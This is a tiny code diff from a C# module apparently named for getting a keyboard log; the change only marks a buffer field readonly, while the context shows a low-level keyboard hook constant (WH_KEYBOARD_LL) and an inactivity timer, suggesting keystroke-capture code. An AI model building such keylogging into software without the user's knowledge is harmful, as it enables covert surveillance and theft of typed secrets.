@@ -14,7 +14,7 @@ namespace Caronte.Modules.Information.GetKeyboardLog
 {
     public class GetKeyboardLogQueryHandler : IRequestHandler<GetKeyboardLogQuery, CommonResponse>
     {
-        private StringBuilder buffer;
+        private readonly StringBuilder buffer;
         private readonly string desktopPath;
         private readonly System.Timers.Timer inactivityTimer;
         private const int WH_KEYBOARD_LL = 13;
